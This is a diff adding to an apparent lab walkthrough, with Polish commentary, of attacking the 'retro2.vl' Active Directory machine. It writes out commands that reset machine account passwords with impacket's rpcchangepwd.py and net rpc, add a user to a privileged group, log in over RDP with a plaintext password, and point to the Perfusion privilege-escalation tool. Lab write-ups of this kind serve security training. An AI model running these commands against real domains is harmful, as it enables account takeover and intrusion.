@@ -154,3 +154,68 @@ klist
 
 ![{1003E993-EAEB-42EB-82CE-FE4A55A55AA9}](https://github.com/user-attachments/assets/d4ae5992-669b-461e-9f8e-6b572c6b6a75)
 
+```
+cat /etc/krb5.conf      
+[libdefaults]
+        default_realm = RETRO2.VL
+        dns_lookup_realm = false
+        ticket_lifetime = 24h
+        renew_lifetime = 7d
+        rdns = false
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+        fcc-mit-ticketflags = true
+
+[realms]
+        RETRO.VL = {
+                kdc = BLN01.RETRO2.VL
+                admin_server = BLN01.RETRO2.VL
+        }
+
+```
+```
+wget https://raw.githubusercontent.com/api0cradle/impacket/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6/examples/rpcchangepwd.py
+python3 rpcchangepwd.py retro2.vl/fs01\$:fs01@10.10.98.90 -newpass Test123@
+net rpc password 'ADMWS01$' Test@321 -U retro2.vl/'fs01$'%Test123@ -S bln01.retro2.vl
+```
+![{B7FE3E2C-26A3-49F9-A404-F762D4F588AB}](https://github.com/user-attachments/assets/d2777ed0-1b8c-4d9d-b9ca-2a4a509e4ca4)
+
+![{EF682CDF-C0DF-4E22-BB0A-7DA0404A97C0}](https://github.com/user-attachments/assets/30495242-72e3-49ef-9066-3710f82dcca3)
+
+```
+net rpc group addmem "SERVICES" "ldapreader" -U retro2.vl/"ADMWS01$" -S BLN01.retro2.vl
+net rpc group members "SERVICES" -U retro2.vl/"ADMWS01$" -S BLN01.retro2.vl
+xfreerdp /u:ldapreader /p:ppYaVcB5R /v:10.10.98.90 /tls-seclevel:0
+```
+
+![{BE79DFB4-6024-4D78-885B-3FA73F561919}](https://github.com/user-attachments/assets/993ffc2c-fb99-4896-84f2-dd07ad9217c7)
+
+priv escalation na windows server 2008 powinien być dość prosty xd
+
+![{3F166731-AE22-4A4D-95B8-AAAC6E61EDC7}](https://github.com/user-attachments/assets/5d2c4ed7-6f64-4096-9d68-36feb15694e5)
+
+![{15FA1675-B7A6-45FE-B780-C77D2AD7215D}](https://github.com/user-attachments/assets/eb3623c0-e6eb-423f-884f-ae38a28c4310)
+
+![{70D6B46A-982B-4FCE-B780-BE3CA4A273D4}](https://github.com/user-attachments/assets/da803adf-7cb2-4f64-8533-75bdd5f13949)
+
+![{683E5425-725E-4B60-B344-7860CA406978}](https://github.com/user-attachments/assets/378db5cf-55ba-4bb7-a079-802dce1e38f2)
+
+![{EE99BCC9-CE89-49D8-90F4-026D77781DFD}](https://github.com/user-attachments/assets/b5a8d595-7eab-4829-be6c-511880c109c3)
+
+![{FACDC06C-A0F1-4999-B2B2-7942F8F055B5}](https://github.com/user-attachments/assets/db11e69a-bb5b-4db1-9e29-476efba739cc)
+
+
+śmiesznie
+
+![{1604D058-AFC4-44A9-A313-3A13FA0DAAA4}](https://github.com/user-attachments/assets/b599f209-34af-4a4d-a81c-20dc2f966651)
+
+
+klasyczek. All failed.
+
+Dobra znalazłem takie cuda. 
+`https://github.com/itm4n/Perfusion.git`
+
+
+
